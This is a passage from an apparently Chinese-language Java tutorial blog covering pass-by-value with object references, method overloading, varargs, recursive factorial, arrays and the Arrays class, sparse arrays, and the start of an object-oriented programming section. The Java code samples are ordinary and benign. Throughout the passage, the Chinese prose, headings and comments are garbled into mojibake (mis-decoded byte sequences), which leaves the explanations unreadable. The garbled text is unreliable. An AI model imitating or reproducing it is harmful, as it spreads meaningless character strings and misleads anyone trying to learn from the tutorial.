<span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;SUBEI&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨userå‰çš„å€¼:&quot;</span> + user.getName() + <span class="string">&quot;,&quot;</span> + user.getAge());</span><br><span class="line">        updateUser(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨useråçš„å€¼:&quot;</span> + user.getName() + <span class="string">&quot;,&quot;</span> + user.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/1f7caad12229ce68470a87760100bb70--07f4--image-20210414143735613.png" alt="img"></p>
<p><strong>åˆ†æ</strong>ï¼š</p>
<ul>
<li>1ï¼‰studentå˜é‡è¢«åˆå§‹åŒ–ä¸ºuserå€¼çš„æ‹·è´ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ã€‚</li>
<li>2ï¼‰è°ƒç”¨studentå˜é‡çš„setæ–¹æ³•ä½œç”¨åœ¨è¿™ä¸ªå¼•ç”¨å¯¹è±¡ä¸Šï¼Œ<strong>userå’ŒstudentåŒæ—¶å¼•ç”¨çš„Userå¯¹è±¡å†…éƒ¨å€¼</strong>è¢«ä¿®æ”¹ã€‚</li>
<li>3ï¼‰æ–¹æ³•ç»“æŸåï¼Œstudentå˜é‡ä¸å†ä½¿ç”¨ï¼Œè¢«é‡Šæ”¾ï¼Œè€Œuserè¿˜æ˜¯æ²¡æœ‰å˜ï¼Œä¾ç„¶æŒ‡å‘Userå¯¹è±¡ã€‚</li>
</ul>
<blockquote>
<p><strong>ç»“è®ºï¼š</strong>æ˜¾ç„¶ï¼ŒUserçš„å€¼è¢«æ”¹å˜äº†ï¼Œä½†æ˜¯è¿™æ˜¯å°†æœ€å¼€å§‹æ‰€å¯¹åº”å¾—å€¼æ”¹å˜äº†ï¼ŒæŠŠUserçš„æœ¬èº«å±æ€§æ”¹å˜äº†ï¼Œæ‰ä¼šè¿›è¡Œå€¼å¾—å˜åŒ–ï¼Œè™½ç„¶çœ‹ä¼¼æ˜¯æŒ‰å¼•ç”¨ä¼ é€’å€¼ï¼Œä½†æ˜¯å®é™…ä¸Šæ˜¯å°†å€¼æ”¹å˜äº†ã€‚ </p>
</blockquote>
<ul>
<li>è¿™ä¸ªè¿‡ç¨‹ä¹Ÿå……åˆ†è¯´æ˜äº†javaç¨‹åºè®¾è®¡è¯­è¨€å¯¹å¯¹è±¡é‡‡ç”¨çš„ä¸æ˜¯å¼•ç”¨è°ƒç”¨ï¼Œå®é™…ä¸Šæ˜¯<strong>å¯¹è±¡å¼•ç”¨è¿›è¡Œçš„æ˜¯å€¼ä¼ é€’</strong>ï¼Œå½“ç„¶åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç®€å•ç†è§£ä¸ºè¿™å°±æ˜¯æŒ‰å€¼è°ƒç”¨å’Œå¼•ç”¨è°ƒç”¨çš„åŒºåˆ«ï¼Œè€Œä¸”å¿…é¡»æ˜ç™½å³ä½¿javaå‡½æ•°åœ¨ä¼ é€’å¼•ç”¨æ•°æ®ç±»å‹æ—¶ï¼Œä¹Ÿåªæ˜¯æ‹·è´äº†å¼•ç”¨çš„å€¼ç½¢äº†ï¼Œä¹‹æ‰€ä»¥èƒ½ä¿®æ”¹å¼•ç”¨æ•°æ®æ˜¯å› ä¸ºå®ƒä»¬åŒæ—¶æŒ‡å‘äº†ä¸€ä¸ªå¯¹è±¡ï¼Œ<strong>ä½†è¿™ä»ç„¶æ˜¯æŒ‰å€¼è°ƒç”¨è€Œä¸æ˜¯å¼•ç”¨è°ƒç”¨ã€‚</strong></li>
<li><strong>æ€»ç»“</strong><ul>
<li>ä¸€ä¸ªæ–¹æ³•ä¸èƒ½ä¿®æ”¹ä¸€ä¸ªåŸºæœ¬æ•°æ®ç±»å‹çš„å‚æ•°ï¼ˆæ•°å€¼å‹å’Œå¸ƒå°”å‹ï¼‰ã€‚</li>
<li>ä¸€ä¸ªæ–¹æ³•å¯ä»¥ä¿®æ”¹ä¸€ä¸ªå¼•ç”¨æ‰€æŒ‡å‘çš„å¯¹è±¡çŠ¶æ€ï¼Œä½†è¿™ä»ç„¶æ˜¯æŒ‰å€¼è°ƒç”¨è€Œéå¼•ç”¨è°ƒç”¨ã€‚</li>
<li>ä¸Šé¢ä¸¤ç§ä¼ é€’éƒ½è¿›è¡Œäº†å€¼æ‹·è´çš„è¿‡ç¨‹ã€‚</li>
</ul>
</li>
</ul>
<h3 id="3ã€æ–¹æ³•é‡è½½"><a href="#3ã€æ–¹æ³•é‡è½½" class="headerlink" title="3ã€æ–¹æ³•é‡è½½"></a>3ã€æ–¹æ³•é‡è½½</h3><ul>
<li>é‡è½½å°±æ˜¯åœ¨ä¸€ä¸ªç±»ä¸­ï¼Œæœ‰ç›¸åŒçš„å‡½æ•°åç§°ï¼Œä½†å½¢å‚ä¸åŒçš„å‡½æ•°ã€‚</li>
<li>æ–¹æ³•çš„é‡è½½çš„è§„åˆ™<ul>
<li>æ–¹æ³•åç§°å¿…é¡»ç›¸åŒã€‚</li>
<li>å‚æ•°åˆ—è¡¨å¿…é¡»ä¸åŒï¼ˆä¸ªæ•°ä¸åŒã€æˆ–ç±»å‹ä¸åŒã€å‚æ•°æ’åˆ—é¡ºåºä¸åŒç­‰ï¼‰<br>æ–¹æ³•çš„è¿”å›ç±»å‹å¯ä»¥ç›¸åŒä¹Ÿå¯ä»¥ä¸ç›¸åŒã€‚</li>
<li>ä»…ä»…è¿”å›ç±»å‹ä¸åŒä¸è¶³ä»¥æˆä¸ºæ–¹æ³•çš„é‡è½½ã€‚</li>
</ul>
</li>
<li>å®ç°ç†è®ºï¼š<ul>
<li>æ–¹æ³•åç§°ç›¸åŒæ—¶ï¼Œç¼–è¯‘å™¨ä¼šæ ¹æ®è°ƒç”¨æ–¹æ³•çš„å‚æ•°ä¸ªæ•°ã€å‚æ•°ç±»å‹ç­‰å»é€ä¸ªåŒ¹é…ï¼Œä»¥é€‰æ‹©å¯¹åº”çš„æ–¹æ³•ï¼Œå¦‚æœåŒ¹é…å¤±è´¥ï¼Œåˆ™ç¼–è¯‘å™¨æŠ¥é”™ã€‚</li>
</ul>
</li>
</ul>
<h3 id="4ã€å‘½ä»¤è¡Œä¼ å‚"><a href="#4ã€å‘½ä»¤è¡Œä¼ å‚" class="headerlink" title="4ã€å‘½ä»¤è¡Œä¼ å‚"></a>4ã€å‘½ä»¤è¡Œä¼ å‚</h3><ul>
<li>é€šè¿‡mainå‡½æ•°ä¸­çš„argså»ä¼ é€’å‚æ•°</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (String arg : args) &#123;</span><br><span class="line">            System.out.println(arg);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h3 id="5ã€å¯å˜å‚æ•°"><a href="#5ã€å¯å˜å‚æ•°" class="headerlink" title="5ã€å¯å˜å‚æ•°"></a>5ã€å¯å˜å‚æ•°</h3><ul>
<li>JDK1.5å¼€å§‹ï¼ŒJavaæ”¯æŒä¼ é€’åŒç±»å‹çš„å¯å˜å‚æ•°ç»™ä¸€ä¸ªæ–¹æ³•ã€‚</li>
<li>åœ¨æ–¹æ³•å£°æ˜ä¸­ï¼Œåœ¨æŒ‡å®šå‚æ•°ç±»å‹ååŠ ä¸€ä¸ªçœç•¥å·ï¼ˆï¼‰ã€‚</li>
<li>ä¸€ä¸ªæ–¹æ³•ä¸­åªèƒ½æŒ‡å®šä¸€ä¸ªå¯å˜å‚æ•°ï¼Œå®ƒå¿…é¡»æ˜¯æ–¹æ³•çš„æœ€åä¸€ä¸ªå‚æ•°ã€‚ä»»ä½•æ™®é€šçš„å‚æ•°å¿…é¡»åœ¨å®ƒä¹‹å‰å£°æ˜ã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.github;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        test(1,2,3,4,5,6);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void test(int... i)&#123;</span><br><span class="line">        for (int k : i) &#123;</span><br><span class="line">            System.out.println(k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6ã€é€’å½’"><a href="#6ã€é€’å½’" class="headerlink" title="6ã€é€’å½’"></a>6ã€é€’å½’</h3><ul>
<li>Aæ–¹æ³•è°ƒç”¨Bæ–¹æ³•ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“ç†è§£ï¼</li>
<li>é€’å½’å°±æ˜¯ï¼šAæ–¹æ³•è°ƒç”¨Aæ–¹æ³•ï¼å°±æ˜¯è‡ªå·±è°ƒç”¨è‡ªå·±ã€‚</li>
<li>åˆ©ç”¨é€’å½’å¯ä»¥ç”¨ç®€å•çš„ç¨‹åºæ¥è§£å†³ä¸€äº›å¤æ‚çš„é—®é¢˜ã€‚å®ƒé€šå¸¸æŠŠä¸€ä¸ªå¤§å‹å¤æ‚çš„é—®é¢˜å±‚å±‚è½¬åŒ–ä¸ºä¸€ä¸ªä¸åŸé—®é¢˜ç›¸ä¼¼çš„è§„æ¨¡è¾ƒå°çš„é—®é¢˜æ¥æ±‚è§£ï¼Œé€’å½’ç­–ç•¥åªéœ€å°‘é‡çš„ç¨‹åºå°±å¯æè¿°å²€è§£é¢˜è¿‡ç¨‹æ‰€éœ€è¦çš„å¤šæ¬¡é‡å¤è®¡ç®—ï¼Œå¤§å¤§åœ°å‡å°‘äº†ç¨‹åºçš„ä»£ç é‡ã€‚é€’å½’çš„èƒ½åŠ›åœ¨äºç”¨æœ‰é™çš„è¯­å¥æ¥å®šä¹‰å¯¹è±¡çš„æ— é™é›†åˆã€‚</li>
<li>é€’å½’ç»“æ„åŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†ï¼š<ul>
<li>é€’å½’å¤´ï¼šä»€ä¹ˆæ—¶å€™ä¸è°ƒç”¨è‡ªèº«æ–¹æ³•ã€‚å¦‚æœæ²¡æœ‰å¤´ï¼Œå°†é™·å…¥æ­»å¾ªç¯ï¼›</li>
<li>é€’å½’ä½“ï¼šä»€ä¹ˆæ—¶å€™éœ€è¦è°ƒç”¨è‡ªèº«æ–¹æ³•ã€‚</li>
</ul>
</li>
</ul>
<p>ç¤ºä¾‹ï¼šä½¿ç”¨é€’å½’æ±‚é˜¶ä¹˜</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(test(<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> n*test(n-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h2><h3 id="1ã€æ•°ç»„æ¦‚è¿°"><a href="#1ã€æ•°ç»„æ¦‚è¿°" class="headerlink" title="1ã€æ•°ç»„æ¦‚è¿°"></a>1ã€æ•°ç»„æ¦‚è¿°</h3><ul>
<li>æ•°ç»„æ˜¯ç›¸åŒç±»å‹æ•°æ®çš„æœ‰åºé›†åˆã€‚</li>
<li>æ•°ç»„æè¿°çš„æ˜¯ç›¸åŒç±»å‹çš„è‹¥å¹²ä¸ªæ•°æ®æŒ‰ç…§ä¸€å®šçš„å…ˆåæ¬¡åºæ’åˆ—ç»„åˆè€Œæˆã€‚</li>
<li>å…¶ä¸­æ¯ä¸€ä¸ªæ•°æ®ç§°ä½œä¸€ä¸ªæ•°ç»„å…ƒç´ æ¯ä¸ªæ•°ç»„å…ƒç´ å¯ä»¥é€šè¿‡ä¸€ä¸ªä¸‹æ ‡æ¥è®¿é—®å®ƒä»¬ã€‚</li>
</ul>
<h3 id="2ã€æ•°ç»„å£°æ˜åˆ›å»º"><a href="#2ã€æ•°ç»„å£°æ˜åˆ›å»º" class="headerlink" title="2ã€æ•°ç»„å£°æ˜åˆ›å»º"></a>2ã€æ•°ç»„å£°æ˜åˆ›å»º</h3><ul>
<li>é¦–å…ˆå¿…é¡»å£°æ˜æ•°ç»„å˜é‡ï¼Œæ‰èƒ½åœ¨ç¨‹åºä¸­ä½¿ç”¨æ•°ç»„ã€‚ä¸‹é¢æ˜¯å£°æ˜æ•°ç»„å˜é‡çš„è¯­æ³•ï¼š</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataType[] arrayRefVar;	<span class="comment">// é¦–é€‰çš„æ–¹æ³•</span></span><br><span class="line">æˆ–</span><br><span class="line">dataType arrayRefVar[];	<span class="comment">// æ•ˆæœç›¸åŒï¼Œä½†ä¸æ˜¯é¦–é€‰æ–¹æ³•</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Javaè¯­è¨€ä½¿ç”¨newæ“ä½œç¬¦æ¥åˆ›å»ºæ•°ç»„ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dataType[] arrayRefVar = <span class="keyword">new</span> <span class="title class_">dataType</span>[arraySize];</span><br></pre></td></tr></table></figure>

<ul>
<li>æ•°ç»„çš„å…ƒç´ æ˜¯é€šè¿‡ç´¢å¼•è®¿é—®çš„ï¼Œæ•°ç»„ç´¢å¼•ä»0å¼€å§‹ã€‚</li>
<li>è·å–æ•°ç»„é•¿åº¦ï¼š<code>arrays. length</code></li>
</ul>
<blockquote>
<p>å†…å­˜åˆ†æ</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/6cadde5fb4d27323c285b0d428245dc7--4b48--image-20240916214245870.png" alt="image-20240916214245870"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/5c5632e65292b3883e07b66cefa2c846--395e--1622105878156.png" alt="1622105878156"></p>
<blockquote>
<p>æ•°ç»„çš„å››ä¸ªåŸºæœ¬ç‰¹ç‚¹ï¼š</p>
</blockquote>
<ul>
<li>å…¶é•¿åº¦æ˜¯ç¡®å®šçš„ã€‚æ•°ç»„ä¸€æ—¦è¢«åˆ›å»ºï¼Œå®ƒçš„å¤§å°å°±æ˜¯ä¸å¯ä»¥æ”¹å˜çš„ï¼›</li>
<li>å…¶å…ƒç´ å¿…é¡»æ˜¯ç›¸åŒç±»å‹ä¸å…è®¸å‡ºç°æ··åˆç±»å‹ã€‚</li>
<li>æ•°ç»„ä¸­çš„å…ƒç´ å¯ä»¥æ˜¯ä»»ä½•æ•°æ®ç±»å‹ï¼ŒåŒ…æ‹¬åŸºæœ¬ç±»å‹å’Œå¼•ç”¨ç±»å‹ã€‚</li>
<li>æ•°ç»„å˜é‡å±å¼•ç”¨ç±»å‹ï¼Œæ•°ç»„ä¹Ÿå¯ä»¥çœ‹æˆæ˜¯å¯¹è±¡ï¼Œæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ç›¸å½“äºè¯¥å¯¹è±¡çš„æˆå‘˜å˜é‡æ•°ç»„æœ¬èº«å°±æ˜¯å¯¹è±¡ï¼ŒJavaä¸­å¯¹è±¡æ˜¯åœ¨å †ä¸­çš„ï¼Œå› æ­¤æ•°ç»„æ— è®ºä¿å­˜åŸå§‹ç±»å‹è¿˜æ˜¯å…¶ä»–å¯¹è±¡ç±»å‹ï¼Œ&#x3D;&#x3D;æ•°ç»„å¯¹è±¡æœ¬èº«æ˜¯åœ¨å †ä¸­çš„&#x3D;&#x3D;ã€‚</li>
</ul>
<blockquote>
<p>ä¸‹æ ‡è¶Šç•ŒåŠå°ç»“ï¼š</p>
</blockquote>
<ul>
<li>ä¸‹æ ‡çš„åˆæ³•åŒºé—´ï¼š[0, length-1]ï¼Œå¦‚æœè¶Šç•Œå°±ä¼šæŠ¥é”™ï¼š</li>
</ul>
<p>æ•°ç»„çš„ä¸‹æ ‡å¼‚å¸¸ï¼š</p>
<ul>
<li><p>ArraylndexOutofBounds Exceptionï¼šæ•°ç»„ä¸‹æ ‡è¶Šç•Œå¼‚å¸¸ï¼</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/ef136c0b0a60d13a465c9eabf4a507c3--9a6b--1622108608331.png" alt="1622108608331"></p>
</li>
<li><p>æ•°ç»„æ˜¯ç›¸åŒæ•°æ®ç±»å‹ï¼ˆæ•°æ®ç±»å‹å¯ä»¥ä¸ºä»»æ„ç±»å‹ï¼‰çš„æœ‰åºé›†åˆæ•°ç»„ä¹Ÿæ˜¯å¯¹è±¡ã€‚</p>
</li>
<li><p>æ•°ç»„å…ƒç´ ç›¸å½“äºå¯¹è±¡çš„æˆå‘˜å˜é‡ã€‚</p>
</li>
<li><p>æ•°ç»„é•¿åº¦çš„ç¡®å®šçš„ï¼Œä¸å¯å˜çš„ã€‚å¦‚æœè¶Šç•Œï¼Œåˆ™æŠ¥ï¼šArrayIndexOutofBoundsã€‚</p>
</li>
</ul>
<h3 id="3ã€æ•°ç»„ä½¿ç”¨"><a href="#3ã€æ•°ç»„ä½¿ç”¨" class="headerlink" title="3ã€æ•°ç»„ä½¿ç”¨"></a>3ã€æ•°ç»„ä½¿ç”¨</h3><ul>
<li><p>æ™®é€šçš„forå¾ªç¯</p>
</li>
<li><p>For-Eachå¾ªç¯</p>
</li>
<li><p>æ•°ç»„ä½œæ–¹æ³•å…¥å‚</p>
</li>
<li><p>æ•°ç»„ä½œè¿”å›å€¼</p>
</li>
</ul>
<h3 id="4ã€å¤šç»´æ•°ç»„"><a href="#4ã€å¤šç»´æ•°ç»„" class="headerlink" title="4ã€å¤šç»´æ•°ç»„"></a>4ã€å¤šç»´æ•°ç»„</h3><ul>
<li>å¤šç»´æ•°ç»„å¯ä»¥çœ‹æˆæ˜¯æ•°ç»„çš„æ•°ç»„ï¼Œæ¯”å¦‚äºŒç»´æ•°ç»„å°±æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ä¸€ç»´æ•°ç»„ï¼Œå…¶æ¯ä¸€ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ã€‚</li>
<li>äºŒç»´æ•°ç»„</li>
</ul>
<h3 id="5ã€Arraysç±»"><a href="#5ã€Arraysç±»" class="headerlink" title="5ã€Arraysç±»"></a>5ã€Arraysç±»</h3><ul>
<li>æ•°ç»„çš„å·¥å…·ç±» javautil. Arrays</li>
<li>ç”±äºæ•°ç»„å¯¹è±¡æœ¬èº«å¹¶æ²¡æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥ä¾›æˆ‘ä»¬è°ƒç”¨ä½†APä¸­æä¾›äº†ä¸€ä¸ªå·¥å…·ç±» Arraysä¾›æˆ‘ä»¬ä½¿ç”¨ä»è€Œå¯ä»¥å¯¹æ•°æ®å¯¹è±¡è¿›è¡Œä¸€äº›åŸºæœ¬çš„æ“ä½œã€‚</li>
<li>&#x3D;&#x3D;æŸ¥çœ‹JDKå¸®åŠ©æ–‡æ¡£&#x3D;&#x3D;ã€‚</li>
<li>Arraysç±»ä¸­çš„æ–¹æ³•éƒ½æ˜¯ static ä¿®é¥°çš„é™æ€æ–¹æ³•åœ¨ä½¿ç”¨çš„æ—¶å€™å¯ä»¥ç›´æ¥ä½¿ç”¨ç±»åè¿›è¡Œè°ƒç”¨ï¼Œè€Œâ€ä¸ç”¨â€ä½¿ç”¨å¯¹è±¡æ¥è°ƒç”¨ï¼ˆæ³¨æ„ï¼šæ˜¯â€œä¸ç”¨â€è€Œä¸æ˜¯â€œä¸èƒ½â€ï¼‰ã€‚</li>
<li>å…·æœ‰ä»¥ä¸‹å¸¸ç”¨åŠŸèƒ½ï¼š<ul>
<li>ç»™æ•°ç»„èµ‹å€¼ï¼šé€šè¿‡fillæ–¹æ³•ã€‚</li>
<li>å¯¹æ•°ç»„æ’åºï¼šé€šè¿‡sortæ–¹æ³•æŒ‰å‡åºã€‚</li>
<li>æ¯”è¾ƒæ•°ç»„ï¼šé€šè¿‡ equalsæ–¹æ³•æ¯”è¾ƒæ•°ç»„ä¸­å…ƒç´ å€¼æ˜¯å¦ç›¸ç­‰ã€‚</li>
<li>æŸ¥æ‰¾æ•°ç»„å…ƒç´ ï¼šé€šè¿‡ binarySearchæ–¹æ³•èƒ½å¯¹æ’åºå¥½çš„æ•°ç»„è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾æ³•æ“ä½œã€‚</li>
</ul>
</li>
</ul>
<p>ä¸€äº›å¸¸ç”¨çš„æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">æ–¹æ³•å	ç®€è¦æè¿°</span><br><span class="line">asList()	è¿”å›ç”±æŒ‡å®šæ•°ç»„æ”¯æŒçš„å›ºå®šå¤§å°çš„åˆ—è¡¨ã€‚</span><br><span class="line">sort()	å°†æ•°ç»„æ’åºï¼ˆå‡åºï¼‰</span><br><span class="line">parallelSort()	å°†æŒ‡å®šçš„æ•°ç»„æŒ‰å‡åºæ’åº</span><br><span class="line">binarySearch()	ä½¿ç”¨äºŒåˆ†æœç´¢æ³•å¿«é€ŸæŸ¥æ‰¾æŒ‡å®šçš„å€¼ï¼ˆå‰ææ˜¯æ•°ç»„å¿…é¡»æ˜¯æœ‰åºçš„ï¼‰</span><br><span class="line">compare()	æŒ‰å­—å…¸é¡ºåºæ¯”è¾ƒä¸¤ä¸ªæ•°ç»„</span><br><span class="line">compareUnsigned()	æŒ‰å­—å…¸é¡ºåºæ¯”è¾ƒä¸¤ä¸ªæ•°ç»„ï¼Œå°†æ•°å­—å…ƒç´ å¤„ç†ä¸ºæ— ç¬¦å·</span><br><span class="line">copyOf()	å¡«å……å¤åˆ¶æ•°ç»„</span><br><span class="line">copyOfRange()	å°†æ•°ç»„çš„æŒ‡å®šèŒƒå›´å¤åˆ¶åˆ°æ–°æ•°ç»„</span><br><span class="line">equals()	æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„</span><br><span class="line">deepEquals()	æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„æ·±åº¦</span><br><span class="line">toString()	å°†æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span><br><span class="line">deepToString()	å°†ä¸€ä¸ªå¤šç»´æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span><br><span class="line">fill()	å°†æŒ‡å®šå…ƒç´ å¡«å……ç»™æ•°ç»„æ¯ä¸€ä¸ªå…ƒç´ </span><br><span class="line">mismatch()	æŸ¥æ‰¾å¹¶è¿”å›ä¸¤ä¸ªæ•°ç»„ä¹‹é—´ç¬¬ä¸€ä¸ªä¸åŒ¹é…çš„ç´¢å¼•ï¼Œå¦‚æœæœªæ‰¾åˆ°åˆ™è¿”å›-<span class="number">1</span></span><br><span class="line">parallelPrefix()	ä½¿ç”¨æä¾›çš„å‡½æ•°å¯¹æ•°ç»„å…ƒç´ è¿›è¡Œæ“ä½œ</span><br><span class="line">parallelSetAll()	ä½¿ç”¨æä¾›çš„ç”Ÿæˆå™¨å‡½æ•°å¹¶è¡Œè®¾ç½®æŒ‡å®šæ•°ç»„çš„æ‰€æœ‰å…ƒç´ ä»¥è®¡ç®—æ¯ä¸ªå…ƒç´ </span><br><span class="line">setAll()	ä½¿ç”¨æä¾›çš„ç”Ÿæˆå™¨å‡½æ•°è®¾ç½®æŒ‡å®šæ•°ç»„çš„æ‰€æœ‰å…ƒç´ ä»¥è®¡ç®—æ¯ä¸ªå…ƒç´ </span><br></pre></td></tr></table></figure>

<h3 id="6ã€ç¨€ç–æ•°ç»„"><a href="#6ã€ç¨€ç–æ•°ç»„" class="headerlink" title="6ã€ç¨€ç–æ•°ç»„"></a>6ã€ç¨€ç–æ•°ç»„</h3><ul>
<li>å½“ä¸€ä¸ªæ•°ç»„ä¸­å¤§éƒ¨åˆ†å…ƒç´ ä¸º0ï¼Œæˆ–è€…ä¸ºåŒä¸€å€¼çš„æ•°ç»„æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç¨€ç–æ•°ç»„æ¥ä¿å­˜è¯¥æ•°ç»„ã€‚</li>
<li>ç¨€ç–æ•°ç»„çš„å¤„ç†æ–¹å¼æ˜¯ï¼š<ul>
<li>è®°å½•æ•°ç»„ä¸€å…±æœ‰å‡ è¡Œå‡ åˆ—ï¼Œæœ‰å¤šå°‘ä¸ªä¸åŒå€¼ã€‚</li>
<li>æŠŠå…·æœ‰ä¸åŒå€¼çš„å…ƒç´ å’Œè¡Œåˆ—åŠå€¼è®°å½•åœ¨ä¸€ä¸ªå°è§„æ¨¡çš„æ•°ç»„ä¸­ï¼Œä»è€Œç¼©å°ç¨‹åºçš„è§„æ¨¡ã€‚</li>
</ul>
</li>
<li>å¦‚ä¸‹å›¾ï¼šå·¦è¾¹æ˜¯åŸå§‹æ•°ç»„ï¼Œå³è¾¹æ˜¯ç¨€ç–æ•°ç»„ã€‚</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/f536e2a3282130e263ee9de36e64baaa--4d2b--1622349200598.png" alt="1622349200598"></p>
<h2 id="é¢å‘å¯¹è±¡ï¼ˆOOPï¼‰"><a href="#é¢å‘å¯¹è±¡ï¼ˆOOPï¼‰" class="headerlink" title="é¢å‘å¯¹è±¡ï¼ˆOOPï¼‰"></a>é¢å‘å¯¹è±¡ï¼ˆOOPï¼‰</h2><h3 id="1ã€åˆå§‹é¢å‘å¯¹è±¡"><a href="#1ã€åˆå§‹é¢å‘å¯¹è±¡" class="headerlink" title="1ã€åˆå§‹é¢å‘å¯¹è±¡"></a>1ã€åˆå§‹é¢å‘å¯¹è±¡</h3><ul>
<li>é¢å‘è¿‡ç¨‹æ€æƒ³<ul>
<li>æ­¥éª¤æ¸…æ™°ç®€å•ï¼Œç¬¬ä¸€æ­¥åšä»€ä¹ˆï¼Œç¬¬äºŒæ­¥åšä»€ä¹ˆâ€¦</li>
<li>é¢å¯¹è¿‡ç¨‹é€‚åˆå¤„ç†ä¸€äº›è¾ƒä¸ºç®€å•çš„é—®é¢˜ã€‚</li>
</ul>
</li>
<li>é¢å‘å¯¹è±¡æ€æƒ³<ul>
<li>ç‰©ä»¥ç±»èšï¼Œåˆ†ç±»çš„æ€ç»´æ¨¡å¼ï¼Œæ€è€ƒé—®é¢˜é¦–å…ˆä¼šè§£å†³é—®é¢˜éœ€è¦å“ªäº›åˆ†ç±»ï¼Œç„¶åå¯¹è¿™äº›åˆ†ç±»è¿›è¡Œå•ç‹¬æ€è€ƒã€‚æœ€åï¼Œæ‰å¯¹æŸä¸ªåˆ†ç±»ä¸‹çš„ç»†èŠ‚è¿›è¡Œé¢å‘è¿‡ç¨‹çš„æ€ç´¢ã€‚</li>
<li>é¢å‘å¯¹è±¡é€‚åˆå¤„ç†å¤æ‚çš„é—®é¢˜ï¼Œé€‚åˆå¤„ç†éœ€è¦å¤šäººåä½œçš„é—®é¢˜ï¼</li>
</ul>
</li>
<li>å¯¹äºæè¿°å¤æ‚çš„äº‹ç‰©ï¼Œä¸ºäº†ä»å®è§‚ä¸ŠæŠŠæ¡ã€ä»æ•´ä½“ä¸Šåˆç†åˆ†æï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨é¢å‘å¯¹è±¡çš„æ€è·¯æ¥åˆ†ææ•´ä¸ªç³»ç»Ÿã€‚ä½†æ˜¯ï¼Œå…·ä½“åˆ°å¾®è§‚æ“ä½œï¼Œä»ç„¶éœ€è¦é¢å‘è¿‡ç¨‹çš„æ€è·¯å»å¤„ç†ã€‚</li>
<li>é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆ Object- Oriented Programming,OOPï¼‰</li>
<li>é¢å‘å¯¹è±¡ç¼–ç¨‹çš„æœ¬è´¨å°±æ˜¯ï¼š&#x3D;&#x3D;ä»¥ç±»çš„æ–¹å¼ç»„ç»‡ä»£ç ï¼Œä»¥å¯¹è±¡çš„ç»„ç»‡ï¼ˆå°è£…ï¼‰æ•°æ®&#x3D;&#x3D;ã€‚</li>
<li>ä¸‰å¤§ç‰¹å¾ï¼š<ul>
<li><strong>ç»§æ‰¿</strong></li>
<li><strong>å°è£…</strong></li>
